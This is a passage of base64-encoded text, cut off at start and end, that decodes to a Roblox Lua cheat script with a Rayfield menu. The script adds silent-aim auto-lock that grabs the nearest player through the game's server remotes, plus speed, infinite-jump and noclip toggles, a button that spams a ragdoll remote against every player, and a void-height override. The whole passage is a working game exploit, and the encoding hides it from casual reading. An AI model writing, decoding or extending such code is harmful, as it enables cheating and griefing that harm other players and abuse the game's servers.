ICAgIEFjdGlvbkV2ZW50KCJSb3RhdGluZ0NvbnRyb2xzIiwgdHJ1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFjdGlvbkV2ZW50KCJSb3RhdGVDb250cm9scyIsIGZhbHNlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgQWN0aW9uRXZlbnQoIiIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGRlc3Ryb3lHcmFiUGFydHMoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICAKICAgICAgICBsb2NhbCBkZXNjZW5kYW50QWRkZWRDb25uZWN0aW9uID0gV29ya3NwYWNlLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBvdGVudGlhbEdyYWJQYXJ0cykKICAgICAgICAgICAgaWYgZ3JhYlBhcnRzTW9kZWxDbG9uZS5QYXJlbnQgYW5kIHBvdGVudGlhbEdyYWJQYXJ0cy5OYW1lID09ICJHcmFiUGFydHMiIGFuZCBwb3RlbnRpYWxHcmFiUGFydHMgfj0gZ3JhYlBhcnRzTW9kZWxDbG9uZSBhbmQgcG90ZW50aWFsR3JhYlBhcnRzLlBhcmVudCA9PSBXb3Jrc3BhY2UgdGhlbgogICAgICAgICAgICAgICAgUnVuU2VydmljZTpVbmJpbmRGcm9tUmVuZGVyU3RlcCgiZHJhZ0JpbmRpbmciKQogICAgICAgICAgICAgICAgUnVuU2VydmljZTpVbmJpbmRGcm9tUmVuZGVyU3RlcCgiYnV0dG9uRGlzdGFuY2VNb3ZpbmciKQogICAgICAgICAgICAgICAgbG9jYWwgZHJhZ1BhcnQgPSBwb3RlbnRpYWxHcmFiUGFydHMuRHJhZ1BhcnQKICAgICAgICAgICAgICAgIGxvY2FsIGJlYW1QYXJ0ID0gcG90ZW50aWFsR3JhYlBhcnRzLkJlYW1QYXJ0CiAgICAgICAgICAgICAgICBsb2NhbCBncmFiUGFydCA9IHBvdGVudGlhbEdyYWJQYXJ0cy5HcmFiUGFydAogICAgICAgICAgICAgICAgaWYgZHJhZ1BhcnQgYW5kIGJlYW1QYXJ0IGFuZCBncmFiUGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgYmVhbVBhcnQuR3JhYkJlYW0uRW5hYmxlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZ3JhYlBhcnQuVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgICAgIGdyYWJQYXJ0LkF0dGFjaFNvdW5kLlZvbHVtZSA9IDAKICAgICAgICAgICAgICAgICAgICBncmFiUGFydC5CZWFtU291bmQuVm9sdW1lID0gMAogICAgICAgICAgICAgICAgICAgIGRyYWdQYXJ0LkFsaWduT3JpZW50YXRpb24uRW5hYmxlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZHJhZ1BhcnQuQWxpZ25Qb3NpdGlvbi5FbmFibGVkID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBDcmVhdGVHcmFiTGluZTpGaXJlU2VydmVyKHBvdGVudGlhbEdyYWJQYXJ0LCBDRnJhbWUubmV3KDAsIDAsIDApKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICAKICAgICAgICBsb2NhbCBmdW5jdGlvbiBDaGVja05ldHdvcmtPd25lclNoaXBPblBhcnQocGFydCkKICAgICAgICAgICAgaWYgdHlwZW9mKHBhcnQpID09ICJJbnN0YW5jZSIgYW5kIHBhcnQ6RmluZEZpcnN0Q2hpbGQoIlBhcnRPd25lciIpIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBwYXJ0LlBhcnRPd25lci5WYWx1ZSA9PSBMb2NhbFBsYXllci5OYW1lCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICByZXR1cm4gZmFsc2UKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBTZXROZXR3b3JrT3duZXI6RmlyZVNlcnZlcihncmFiUGFydE9ySGVhZCwgV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lKQogICAgICAgIAogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBncmFiUGFydHNNb2RlbENsb25lLlBhcmVudCBhbmQgcG90ZW50aWFsR3JhYlBhcnQ6SXNEZXNjZW5kYW50T2YoV29ya3NwYWNlKSBkbwogICAgICAgICAgICAgICAgaWYgQ2hlY2tOZXR3b3JrT3duZXJTaGlwT25QYXJ0KGdyYWJQYXJ0T3JIZWFkKSBhbmQgbm90IGlzR3JhYmJpbmcgdGhlbgogICAgICAgICAgICAgICAgICAgIHBjRGlzdGFuY2UyID0gKHBvdGVudGlhbEdyYWJQYXJ0LlBvc2l0aW9uIC0gV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLlBvc2l0aW9uKS5NYWduaXR1ZGUKICAgICAgICAgICAgICAgICAgICBFeHRlbmRHcmFiTGluZTpGaXJlU2VydmVyKHBjRGlzdGFuY2UyKQogICAgICAgICAgICAgICAgICAgIENyZWF0ZUdyYWJMaW5lOkZpcmVTZXJ2ZXIocG90ZW50aWFsR3JhYlBhcnQsIENGcmFtZS5uZXcoMCwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuUGxheWVyU2NyaXB0cy5DaGFyYWN0ZXJBbmRCZWFtTW92ZS5HcmFiTm90aWZ5RXZlbnQ6RmlyZSh0cnVlKQogICAgICAgICAgICAgICAgICAgIGlzR3JhYmJpbmcgPSB0cnVlCiAgICAgICAgICAgICAgICBlbHNlaWYgbm90IENoZWNrTmV0d29ya093bmVyU2hpcE9uUGFydChncmFiUGFydE9ySGVhZCkgYW5kIGlzR3JhYmJpbmcgdGhlbgogICAgICAgICAgICAgICAgICAgIGlzR3JhYmJpbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGdyYWJQYXJ0c01vZGVsQ2xvbmUuRHJhZ1BhcnQuUG9zaXRpb24gPSBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIHBjRGlzdGFuY2UyICsgV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLlBvc2l0aW9uCiAgICAgICAgICAgICAgICBncmFiUGFydHNNb2RlbENsb25lLkRyYWdQYXJ0LkRyYWdBdHRhY2guV29ybGRPcmllbnRhdGlvbiA9IFdvcmtzcGFjZS5Sb3RhdGVPcmllbnRQYXJ0LlBhcnRPcmllbnQuV29ybGRPcmllbnRhdGlvbgogICAgICAgICAgICAgICAgZ3JhYlBhcnRzTW9kZWxDbG9uZS5CZWFtUGFydC5DRnJhbWUgPSBDRnJhbWUubG9va0F0KGdyYWJQYXJ0c01vZGVsQ2xvbmUuR3JhYlBhcnQuUG9zaXRpb24sIGdyYWJQYXJ0c01vZGVsQ2xvbmUuRHJhZ1BhcnQuUG9zaXRpb24sIFZlY3RvcjMubmV3KDAsIDAsIDEpKQogICAgICAgICAgICAgICAgZ3JhYlBhcnRzTW9kZWxDbG9uZS5CZWFtUGFydC5HcmFiQmVhbS5DdXJ2ZVNpemUxID0gKGdyYWJQYXJ0c01vZGVsQ2xvbmUuR3JhYlBhcnQuUG9zaXRpb24gLSBncmFiUGFydHNNb2RlbENsb25lLkRyYWdQYXJ0LlBvc2l0aW9uKS5NYWduaXR1ZGUgKiAxLjUKICAgICAgICAgICAgICAgIGdyYWJQYXJ0c01vZGVsQ2xvbmUuR3JhYlBhcnQuQmVhbVNvdW5kLlBsYXliYWNrU3BlZWQgPSAoZ3JhYlBhcnRzTW9kZWxDbG9uZS5HcmFiUGFydC5Qb3NpdGlvbiAtIGdyYWJQYXJ0c01vZGVsQ2xvbmUuRHJhZ1BhcnQuUG9zaXRpb24pLk1hZ25pdHVkZSAqIDEuNSAqIDEuNSAvIDIgKyAyLjUKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaW5wdXRDaGFuZ2VkQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgaW5wdXRCZWdhbkNvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgIGRlc2NlbmRhbnRBZGRlZENvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgIEFjdGlvbkV2ZW50KCJHcmFiYmluZ0NvbnRyb2xzIiwgZmFsc2UpCiAgICAgICAgICAgIEFjdGlvbkV2ZW50KCJHcmFiQ29udHJvbHMiLCBmYWxzZSkKICAgICAgICAgICAgQWN0aW9uRXZlbnQoIlJvdGF0aW5nQ29udHJvbHMiLCBmYWxzZSkKICAgICAgICAgICAgQWN0aW9uRXZlbnQoIlJvdGF0ZUNvbnRyb2xzIiwgZmFsc2UpCiAgICAgICAgICAgIExvY2FsUGxheWVyLlBsYXllclNjcmlwdHMuQ2hhcmFjdGVyQW5kQmVhbU1vdmUuR3JhYk5vdGlmeUV2ZW50OkZpcmUoZmFsc2UpCiAgICAgICAgICAgIERlc3Ryb3lHcmFiTGluZTpGaXJlU2VydmVyKHBvdGVudGlhbEdyYWJQYXJ0KQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgX0cuQWN0dWFsRmFrZUdyYWJQYXJ0cyB0aGVuCiAgICAgICAgICAgICAgICBfRy5BY3R1YWxGYWtlR3JhYlBhcnRzOkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgX0cuQWN0dWFsRmFrZUdyYWJQYXJ0cyA9IG5pbAogICAgICAgICAgICBfRy5Sb3RhdGluZ0Zha2VHcmFiUGFydHMgPSBmYWxzZQogICAgICAgICAgICBpc1JvdGF0aW5nRmFrZUdyYWJQYXJ0cyA9IGZhbHNlCiAgICAgICAgICAgIFdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVR5cGUgPSBFbnVtLkNhbWVyYVR5cGUuQ3VzdG9tCiAgICAgICAgICAgIFVzZXJJbnB1dFNlcnZpY2UuTW91c2VCZWhhdmlvciA9IEVudW0uTW91c2VCZWhhdmlvci5EZWZhdWx0CiAgICAgICAgZW5kKQogICAgZWxzZWlmIGFjdHVhbEZha2VHcmFiUGFydHMgdGhlbgogICAgICAgIGFjdHVhbEZha2VHcmFiUGFydHM6RGVzdHJveSgpCiAgICBlbmQKZW5kCgpVc2VySW5wdXRTZXJ2aWNlLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnB1dE9iamVjdCkKICAgIGlmIGlucHV0T2JqZWN0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSB0aGVuCiAgICAgICAgaWYgbm90IF9HLlNpbGVudEFpbVYyIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGlmIF9HLkFjdHVhbEZha2VHcmFiUGFydHMgdGhlbgogICAgICAgICAgICBfRy5BY3R1YWxGYWtlR3JhYlBhcnRzOkRlc3Ryb3koKQogICAgICAgICAgICBfRy5BY3R1YWxGYWtlR3JhYlBhcnRzID0gbmlsCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGlmIFdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiR3JhYlBhcnRzIikgdGhlbgogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBpZiBub3QgbmVhcmVzdFBsYXllckluZm8gb3IgbmVhcmVzdFBsYXllckluZm8gPT0gTG9jYWxQbGF5ZXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgdGFyZ2V0Q2hhciA9IG5lYXJlc3RQbGF5ZXJJbmZvLkNoYXJhY3RlcgogICAgICAgIGlmIG5vdCB0YXJnZXRDaGFyIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIHRhcmdldFJvb3QgPSB0YXJnZXRDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBsb2NhbCB0YXJnZXRIdW1hbm9pZCA9IHRhcmdldENoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgCiAgICAgICAgaWYgbm90IHRhcmdldFJvb3Qgb3Igbm90IHRhcmdldEh1bWFub2lkIG9yIHRhcmdldEh1bWFub2lkLkhlYWx0aCA8PSAwIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIG15Q2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIG15Um9vdCA9IG15Q2hhciBhbmQgbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAKICAgICAgICBpZiBub3QgbXlSb290IHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIGRpc3RhbmNlID0gKG15Um9vdC5Qb3NpdGlvbiAtIHRhcmdldFJvb3QuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgIAogICAgICAgIGlmIGRpc3RhbmNlIDw9IG1heERpc3RhbmNlIHRoZW4KICAgICAgICAgICAgbG9jYWwgaGl0Ym94SW5kZXggPSBtYXRoLnJhbmRvbSgxLCAjZ2V0Z2VudigpLlNldHRpbmdzLkhpdGJveCkKICAgICAgICAgICAgbG9jYWwgaGl0Ym94TmFtZSA9IGdldGdlbnYoKS5TZXR0aW5ncy5IaXRib3hbaGl0Ym94SW5kZXhdCiAgICAgICAgICAgIGxvY2FsIGhpdGJveFBhcnQgPSB0YXJnZXRDaGFyOkZpbmRGaXJzdENoaWxkKGhpdGJveE5hbWUpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBoaXRib3hQYXJ0IHRoZW4KICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgR3JhYlBhcnRGYWtlKGhpdGJveFBhcnQpCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpsb2NhbCBTaWxlbnRBaW1TZWN0aW9uID0gQ29tYmF0VGFiOkNyZWF0ZVNlY3Rpb24oIkF1dG8gTG9jayIpCgpDb21iYXRUYWI6Q3JlYXRlVG9nZ2xlKHsKICAgTmFtZSA9ICJTaWxlbnQgQWltIiwKICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgIEZsYWcgPSAiU2lsZW50QWltVjIiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICBfRy5TaWxlbnRBaW1WMiA9IFZhbHVlCiAgICAgIGlmIFZhbHVlIHRoZW4KICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiQXV0byBMb2NrIiwKICAgICAgICAgICAgQ29udGVudCA9ICJFbmFibGVkIiwKICAgICAgICAgICAgRHVyYXRpb24gPSAzLAogICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgsCiAgICAgICAgIH0pCiAgICAgIGVuZAogICBlbmQsCn0pCgpDb21iYXRUYWI6Q3JlYXRlU2xpZGVyKHsKICAgTmFtZSA9ICJMb2NrIFJhbmdlIiwKICAgUmFuZ2UgPSB7MTAsIDUwfSwKICAgSW5jcmVtZW50ID0gMSwKICAgU3VmZml4ID0gIiBzdHVkcyIsCiAgIEN1cnJlbnRWYWx1ZSA9IDEwLAogICBGbGFnID0gIlNpbGVudEFpbVJhbmdlIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgbWF4RGlzdGFuY2UgPSBWYWx1ZQogICBlbmQsCn0pCgpDb21iYXRUYWI6Q3JlYXRlU2xpZGVyKHsKICAgTmFtZSA9ICJGT1YgQ2lyY2xlIFNpemUiLAogICBSYW5nZSA9IHs1MCwgODAwfSwKICAgSW5jcmVtZW50ID0gNSwKICAgU3VmZml4ID0gIiBweCIsCiAgIEN1cnJlbnRWYWx1ZSA9IDI1MCwKICAgRmxhZyA9ICJGT1ZTaXplIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgZ2V0Z2VudigpLlNldHRpbmdzLkZvdiA9IFZhbHVlCiAgIGVuZCwKfSkKCkNvbWJhdFRhYjpDcmVhdGVEcm9wZG93bih7CiAgIE5hbWUgPSAiVGFyZ2V0IEJvZHkgUGFydCIsCiAgIE9wdGlvbnMgPSB7IkhlYWQiLCAiSHVtYW5vaWRSb290UGFydCIsICJVcHBlclRvcnNvIiwgIkxvd2VyVG9yc28ifSwKICAgQ3VycmVudE9wdGlvbiA9IHsiSGVhZCJ9LAogICBNdWx0aXBsZU9wdGlvbnMgPSB0cnVlLAogICBGbGFnID0gIkhpdGJveCIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oT3B0aW9ucykKICAgICAgZ2V0Z2VudigpLlNldHRpbmdzLkhpdGJveCA9IE9wdGlvbnMKICAgZW5kLAp9KQoKbG9jYWwgTW92ZW1lbnRTZWN0aW9uID0gUGxheWVyVGFiOkNyZWF0ZVNlY3Rpb24oIk1vdmVtZW50IikKCmZ1bmN0aW9uIFNoYXJlZFNldHRpbmdzLldhbGtzcGVlZEZ1bmMoKQogICAgaWYgU2hhcmVkU2V0dGluZ3MuQ29ubmVjdGlvbnMuV1MgdGhlbgogICAgICAgIFNoYXJlZFNldHRpbmdzLkNvbm5lY3Rpb25zLldTOkRpc2Nvbm5lY3QoKQogICAgZW5kCiAgICBpZiBTaGFyZWRTZXR0aW5ncy5XYWxrc3BlZWQgdGhlbgogICAgICAgIFNoYXJlZFNldHRpbmdzLkNvbm5lY3Rpb25zLldTID0gUnVuU2VydmljZS5TdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBwID0gUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICBpZiBwIGFuZCBwLkNoYXJhY3RlciBhbmQgcC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBhbmQgcC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpIGFuZCB0eXBlb2YoU2hhcmVkU2V0dGluZ3MuV2Fsa3NwZWVkVmFsdWUpID09ICJudW1iZXIiIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGggPSBwLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgICAgICBsb2NhbCB1ID0gcC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICBoLkNGcmFtZSA9IGguQ0ZyYW1lICsgdS5Nb3ZlRGlyZWN0aW9uICogKDE2ICogU2hhcmVkU2V0dGluZ3MuV2Fsa3NwZWVkVmFsdWUgLyAxMCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCmVuZAoKZnVuY3Rpb24gU2hhcmVkU2V0dGluZ3MuSW5maW5pdGVKdW1wRnVuYygpCiAgICBpZiBTaGFyZWRTZXR0aW5ncy5Db25uZWN0aW9ucy5KUCB0aGVuCiAgICAgICAgU2hhcmVkU2V0dGluZ3MuQ29ubmVjdGlvbnMuSlA6RGlzY29ubmVjdCgpCiAgICBlbmQKICAgIGlmIFNoYXJlZFNldHRpbmdzLkluZmluaXRlSnVtcCB0aGVuCiAgICAgICAgU2hhcmVkU2V0dGluZ3MuQ29ubmVjdGlvbnMuSlAgPSBVc2VySW5wdXRTZXJ2aWNlLkp1bXBSZXF1ZXN0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgIGlmIHBsYXllciBhbmQgcGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgaHVtYW5vaWQ6Q2hhbmdlU3RhdGUoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5GcmVlZmFsbCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBodW1hbm9pZDpDaGFuZ2VTdGF0ZShFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkp1bXBpbmcpCiAgICAgICAgICAgICAgICBpZiBodW1hbm9pZC5Vc2VKdW1wUG93ZXIgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgICAgIGh1bWFub2lkLkp1bXBIZWlnaHQgPSBtYXRoLmNsYW1wKFNoYXJlZFNldHRpbmdzLkluZmluaXRlSnVtcFBvd2VyIC8gMTAsIDcuMiwgNTApCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWQuSnVtcFBvd2VyID0gU2hhcmVkU2V0dGluZ3MuSW5maW5pdGVKdW1wUG93ZXIKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kCgpmdW5jdGlvbiBTaGFyZWRTZXR0aW5ncy5Ob2NsaXBGdW5jKCkKICAgIGlmIFNoYXJlZFNldHRpbmdzLkNvbm5lY3Rpb25zLk5DIHRoZW4KICAgICAgICBTaGFyZWRTZXR0aW5ncy5Db25uZWN0aW9ucy5OQzpEaXNjb25uZWN0KCkKICAgIGVuZAogICAgaWYgU2hhcmVkU2V0dGluZ3MuTm9jbGlwIHRoZW4KICAgICAgICBTaGFyZWRTZXR0aW5ncy5Db25uZWN0aW9ucy5OQyA9IFJ1blNlcnZpY2UuU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgcCA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICAgICAgaWYgcCBhbmQgcC5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gaXBhaXJzKHAuQ2hhcmFjdGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgcGFydDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBwYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAplbmQKClBsYXllclRhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJTcGVlZCIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiV2Fsa3NwZWVkIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgU2hhcmVkU2V0dGluZ3MuV2Fsa3NwZWVkID0gVmFsdWUKICAgICAgICBTaGFyZWRTZXR0aW5ncy5XYWxrc3BlZWRGdW5jKCkKICAgIGVuZAp9KQoKUGxheWVyVGFiOkNyZWF0ZVNsaWRlcih7CiAgICBOYW1lID0gIlNwZWVkIE11bHRpcGxpZXIiLAogICAgUmFuZ2UgPSB7MSwgNX0sCiAgICBJbmNyZW1lbnQgPSAwLjEsCiAgICBTdWZmaXggPSAieCIsCiAgICBDdXJyZW50VmFsdWUgPSAxLAogICAgRmxhZyA9ICJXYWxrc3BlZWRWYWx1ZSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIFNoYXJlZFNldHRpbmdzLldhbGtzcGVlZFZhbHVlID0gVmFsdWUKICAgIGVuZAp9KQoKUGxheWVyVGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIkluZmluaXRlIEp1bXAiLAogICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICBGbGFnID0gIkluZmluaXRlSnVtcCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIFNoYXJlZFNldHRpbmdzLkluZmluaXRlSnVtcCA9IFZhbHVlCiAgICAgICAgU2hhcmVkU2V0dGluZ3MuSW5maW5pdGVKdW1wRnVuYygpCiAgICBlbmQKfSkKClBsYXllclRhYjpDcmVhdGVTbGlkZXIoewogICAgTmFtZSA9ICJKdW1wIFBvd2VyIiwKICAgIFJhbmdlID0gezE2LCA1MDB9LAogICAgSW5jcmVtZW50ID0gMSwKICAgIFN1ZmZpeCA9ICIgcG93ZXIiLAogICAgQ3VycmVudFZhbHVlID0gMTYsCiAgICBGbGFnID0gIkp1bXBQb3dlciIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIFNoYXJlZFNldHRpbmdzLkluZmluaXRlSnVtcFBvd2VyID0gVmFsdWUKICAgIGVuZAp9KQoKUGxheWVyVGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIk5vY2xpcCIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiTm9jbGlwIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgU2hhcmVkU2V0dGluZ3MuTm9jbGlwID0gVmFsdWUKICAgICAgICBTaGFyZWRTZXR0aW5ncy5Ob2NsaXBGdW5jKCkKICAgIGVuZAp9KQoKbG9jYWwgQW50aVNlY3Rpb24gPSBJbnZpbmNpYmlsaXR5VGFiOkNyZWF0ZVNlY3Rpb24oIlByb3RlY3Rpb24iKQoKbG9jYWwgZnVuY3Rpb24gcmFnZG9sbEFsbFBsYXllcnMoKQogICAgaWYgUmFnZG9sbFJlbW90ZSB0aGVuCiAgICAgICAgZm9yIF8sIHBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgIGZvciBfID0gMSwgMTUwIGRvCiAgICAgICAgICAgICAgICAgICAgUmFnZG9sbFJlbW90ZTpGaXJlU2VydmVyKHBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydCwgOTk5OTk5OSkKICAgICAgICAgICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJTdWNjZXNzIiwKICAgICAgICAgICAgQ29udGVudCA9ICJBbnRpIFJhZ2RvbGwgQXBwbGllZCIsCiAgICAgICAgICAgIER1cmF0aW9uID0gMywKICAgICAgICAgICAgSW1hZ2UgPSA0NDgzMzYyNDU4LAogICAgICAgIH0pCiAgICBlbHNlCiAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiRXJyb3IiLAogICAgICAgICAgICBDb250ZW50ID0gIlJhZ2RvbGxSZW1vdGUgbm90IGZvdW5kIiwKICAgICAgICAgICAgRHVyYXRpb24gPSAzLAogICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgsCiAgICAgICAgfSkKICAgIGVuZAplbmQKCkludmluY2liaWxpdHlUYWI6Q3JlYXRlQnV0dG9uKHsKICAgIE5hbWUgPSAiQW50aSBSYWdkb2xsIiwKICAgIENhbGxiYWNrID0gcmFnZG9sbEFsbFBsYXllcnMKfSkKCkludmluY2liaWxpdHlUYWI6Q3JlYXRlQnV0dG9uKHsKICAgIE5hbWUgPSAiRGVsZXRlIFZvaWQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgV29ya3NwYWNlLkZhbGxlblBhcnRzRGVzdHJveUhlaWdodCA9IC0xZTk1CiAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiU3VjY2VzcyIsCiAgICAgICAgICAgIENvbnRlbnQgPSAiVm9pZCBEZXN0cm95ZWQiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OCwKICAgICAgICB9KQogICAgZW5kCn0pCgpsb2NhbCBhbnRpR3JhYkVuYWJsZWQgPSBmYWxzZQpsb2NhbCBmdW5jdGlvbiBhbnRpR3JhYigpCiAgICB3aGlsZSBhbnRpR3JhYkVuYWJsZWQgYW5kIHRhc2s